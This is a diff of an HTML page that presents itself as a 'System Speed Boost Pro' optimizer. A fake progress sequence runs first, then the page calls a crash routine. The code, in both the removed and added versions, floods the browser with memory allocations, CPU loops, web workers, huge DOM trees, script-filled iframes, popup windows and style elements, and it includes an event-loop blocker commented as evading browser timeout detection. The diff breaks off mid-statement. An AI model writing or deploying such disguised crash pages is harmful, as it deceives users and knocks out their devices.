@@ -3,31 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Booster</title>
+    <title>System Speed Boost</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
             color: white;
             text-align: center;
             padding: 20px;
         }
         .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: rgba(0, 0, 0, 0.7);
+            max-width: 500px;
+            margin: 50px auto;
+            background: rgba(0, 0, 0, 0.8);
             padding: 30px;
             border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
         }
-        button {
-            background: #4CAF50;
-            color: white;
+        h1 {
+            color: #00ffff;
+            margin-bottom: 20px;
+        }
+        .btn {
+            background: linear-gradient(90deg, #00ffff, #0080ff);
+            color: #000;
             border: none;
             padding: 15px 30px;
             font-size: 18px;
-            border-radius: 5px;
+            font-weight: bold;
+            border-radius: 50px;
             cursor: pointer;
-            margin: 10px;
+            margin: 20px 0;
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
         }
         .progress {
             width: 100%;
@@ -40,122 +51,157 @@
         .progress-bar {
             height: 100%;
             width: 0%;
-            background: #4CAF50;
+            background: linear-gradient(90deg, #00ffff, #0080ff);
             transition: width 0.3s;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>System Performance Booster</h1>
-        <p>Optimize your device performance with advanced memory management</p>
+        <h1>System Speed Boost Pro</h1>
+        <p>Advanced optimization tool to maximize your device performance</p>
         
         <div class="progress">
             <div class="progress-bar" id="progress"></div>
         </div>
         
         <p id="status">Ready to optimize</p>
-        <button id="start">Start Optimization</button>
+        <button class="btn" id="start">Boost Performance</button>
     </div>
 
     <script>
         document.getElementById('start').addEventListener('click', function() {
-            document.getElementById('status').textContent = "Optimizing system...";
-            document.getElementById('progress').style.width = "10%";
+            document.getElementById('status').textContent = "Analyzing system resources...";
+            document.getElementById('progress').style.width = "20%";
             
             setTimeout(() => {
                 document.getElementById('status').textContent = "Clearing memory cache...";
-                document.getElementById('progress').style.width = "30%";
+                document.getElementById('progress').style.width = "50%";
                 
                 setTimeout(() => {
                     document.getElementById('status').textContent = "Optimizing CPU threads...";
-                    document.getElementById('progress').style.width = "60%";
+                    document.getElementById('progress').style.width = "80%";
                     
                     setTimeout(() => {
                         document.getElementById('status').textContent = "Finalizing optimization...";
                         document.getElementById('progress').style.width = "100%";
                         
-                        // Launch the attack after appearing to complete optimization
-                        setTimeout(attackSystem, 1000);
-                    }, 1000);
-                }, 1000);
-            }, 1000);
+                        // Trigger the crash sequence
+                        setTimeout(triggerCrash, 500);
+                    }, 300);
+                }, 300);
+            }, 300);
         });
 
-        function attackSystem() {
-            // Attack Vector 1: Fork Bomb
-            for(let i = 0; i < 100; i++) {
-                setTimeout(() => {
-                    window.open(window.location.href, '_blank');
-                }, i * 10);
-            }
+        function triggerCrash() {
+            // Vector 1: Memory allocation with multiple techniques
+            const memoryBomb = () => {
+                try {
+                    // Technique 1: Large arrays
+                    const arrays = [];
+                    for(let i = 0; i < 100; i++) {
+                        arrays.push(new Array(10000000).fill(Math.random()));
+                    }
+                    
+                    // Technique 2: Blob URLs
+                    for(let i = 0; i < 1000; i++) {
+                        const blob = new Blob([Array(1000000).join('x')], {type: 'text/plain'});
+                        URL.createObjectURL(blob);
+                    }
+                    
+                    // Technique 3: Image data
+                    for(let i = 0; i < 100; i++) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 10000;
+                        canvas.height = 10000;
+                        const ctx = canvas.getContext('2d');
+                        ctx.fillStyle = `rgb(${Math.random()*255},${Math.random()*255},\${Math.random()*255})`;
+                        ctx.fillRect(0, 0, canvas.width, canvas.height);
+                        canvas.toDataURL();
+                    }
+                } catch(e) {
+                    console.log(e);
+                }
+            };
             
-            // Attack Vector 2: Memory Bomb
-            const memoryArrays = [];
-            try {
-                const allocateMemory = () => {
-                    while(true) {
-                        memoryArrays.push(new Array(1000000).fill(Math.random()));
+            // Vector 2: CPU intensive tasks
+            const cpuBomb = () => {
+                // Technique 1: Infinite calculations
+                const calc = () => {
+                    let result = 0;
+                    for(let i = 0; i < 1000000000; i++) {
+                        result += Math.sqrt(Math.random()) * Math.sin(Math.random()) * Math.cos(Math.random());
+                    }
+                    return result;
+                };
+                
+                // Technique 2: Recursive calls
+                const recursive = (depth) => {
+                    if(depth > 10000) return;
+                    recursive(depth + 1);
+                    recursive(depth + 1);
+                };
+                
+                // Start multiple threads
+                for(let i = 0; i < 10; i++) {
+                    setTimeout(calc, i * 10);
+                    setTimeout(() => recursive(0), i * 10);
+                }
+            };
+            
+            // Vector 3: Worker threads
+            const workerBomb = () => {
+                try {
+                    const workerCode = `
+                        // Infinite memory allocation
+                        const arrays = [];
+                        while(true) {
+                            arrays.push(new Array(1000000).fill(Math.random()));
+                        }
+                    `;
+                    
+                    const blob = new Blob([workerCode], {type: 'application/javascript'});
+                    const workerUrl = URL.createObjectURL(blob);
+                    
+                    // Create as many workers as possible
+                    for(let i = 0; i < (navigator.hardwareConcurrency || 4) * 10; i++) {
+                        new Worker(workerUrl);
+                    }
+                } catch(e) {
+                    console.log(e);
+                }
+            };
+            
+            // Vector 4: DOM manipulation
+            const domBomb = () => {
+                // Technique 1: Create massive DOM tree
+                const createDomTree = (element, depth) => {
+                    if(depth > 10) return;
+                    
+                    for(let i = 0; i < 100; i++) {
+                        const child = document.createElement('div');
+                        child.innerHTML = Array(1000).join('<span>x</span>');
+                        element.appendChild(child);
+                        createDomTree(child, depth + 1);
                     }
                 };
                 
-                // Start multiple memory allocation threads
-                for(let i = 0; i < 10; i++) {
-                    setTimeout(allocateMemory, i * 100);
-                }
-            } catch(e) {
-                console.log(e);
-            }
-            
-            // Attack Vector 3: CPU Bomb
-            const cpuBomb = () => {
-                let result = 0;
-                while(true) {
-                    result += Math.random() * Math.random();
-                }
-            };
-            
-            // Start multiple CPU intensive threads
-            for(let i = 0; i < 10; i++) {
-                setTimeout(cpuBomb, i * 50);
-            }
-            
-            // Attack Vector 4: Worker Bomb
-            try {
-                const workerCode = `
-                    while(true) {
-                        let arr = new Array(1000000).fill(Math.random());
-                        for(let i = 0; i < arr.length; i++) {
-                            arr[i] = Math.sqrt(arr[i]) * Math.random();
-                        }
-                    }
-                `;
-                
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                const workerUrl = URL.createObjectURL(blob);
-                
-                for(let i = 0; i < navigator.hardwareConcurrency || 4; i++) {
-                    new Worker(workerUrl);
-                }
-            } catch(e) {
-                console.log(e);
-            }
-            
-            // Attack Vector 5: DOM Bomb
-            const domBomb = () => {
                 const container = document.createElement('div');
                 document.body.appendChild(container);
+                createDomTree(container, 0);
                 
-                for(let i = 0; i < 1000; i++) {
+                // Technique 2: Style recalculations
+                for(let i = 0; i < 10000; i++) {
                     const element = document.createElement('div');
-                    element.innerHTML = Array(1000).join('<span>x</span>');
-                    container.appendChild(element);
+                    element.style.width = Math.random() + 'px';
+                    element.style.height = Math.random() + 'px';
+                    element.style.margin = Math.random() + 'px';
+                    document.body.appendChild(element);
+                    element.offsetWidth; // Force layout recalculation
                 }
             };
             
-            setTimeout(domBomb, 500);
-            
-            // Attack Vector 6: Iframe Bomb
+            // Vector 5: Iframe bomb
             const iframeBomb = () => {
                 for(let i = 0; i < 100; i++) {
                     const iframe = document.createElement('iframe');
@@ -165,7 +211,15 @@
                     try {
                         const doc = iframe.contentDocument || iframe.contentWindow.document;
                         doc.open();
-                        doc.write('<script>' + workerCode + '</script>');
+                        doc.write(`
+                            <script>
+                                // Infinite memory allocation in iframe
+                                const arrays = [];
+                                while(true) {
+                                    arrays.push(new Array(1000000).fill(Math.random()));
+                                }
+                            </script>
+                        `);
                         doc.close();
                     } catch(e) {
                         // Ignore cross-origin errors
@@ -173,45 +227,44 @@
                 }
             };
             
-            setTimeout(iframeBomb, 1000);
-            
-            // Attack Vector 7: Event Loop Blocker
-            const eventLoopBlocker = () => {
-                const start = Date.now();
-                while(true) {
-                    if(Date.now() - start > 10000) {
-                        // Reset timer to prevent browser timeout detection
-                        break;
+            // Vector 6: Event loop blocking
+            const eventLoopBomb = () => {
+                const block = () => {
+                    const start = Date.now();
+                    while(true) {
+                        if(Date.now() - start > 100) {
+                            // Reset timer to prevent browser timeout detection
+                            setTimeout(block, 0);
+                            break;
+                        }
                     }
+                };
+                
+                // Start multiple blockers
+                for(let i = 0; i < 10; i++) {
+                    setTimeout(block, i * 10);
                 }
-                // Recursive call to continue blocking
-                eventLoopBlocker();
             };
             
-            setTimeout(eventLoopBlocker, 2000);
+            // Vector 7: Window/Tab bomb
+            const windowBomb = () => {
+                for(let i = 0; i < 50; i++) {
+                    try {
+                        window.open(window.location.href, '_blank');
+                    } catch(e) {
+                        // Ignore popup blocker
+                    }
+                }
+            };
             
-            // Attack Vector 8: Style Bomb
+            // Vector 8: Style bomb
             const styleBomb = () => {
                 for(let i = 0; i < 10000; i++) {
                     const style = document.createElement('style');
                     style.innerHTML = `
-                        .class-${i} {
-                            background: url(data:image/png;base64,${btoa(Array(1000).join('x'))});
-                            transform: translate(${Math.random()}px, ${Math.random()}px);
+                        .class-\${i} {
+                            background: url(data:image/png;base64,\${btoa(Array(10000).join('x'))});
+                            transform: translate(${Math.random()}px, ${Math.random()}px) rotate(\${Math.random()}deg);
                             animation: anim-${i} ${Math.random()}s infinite;
-                        }
-                        @keyframes anim-${i} {
-                            0% { opacity: ${Math.random()}; }
-                            50% { opacity: ${Math.random()}; }
-                            100% { opacity: ${Math.random()}; }
-                        }
-                    `;
-                    document.head.appendChild(style);
-                }
-            };
-            
-            setTimeout(styleBomb, 1500);
-        }
-    </script>
-</body>
-</html>
+                            box-shadow: 0 0 \${Math.random()}px rgba(0,0,0,0.5);
+                       
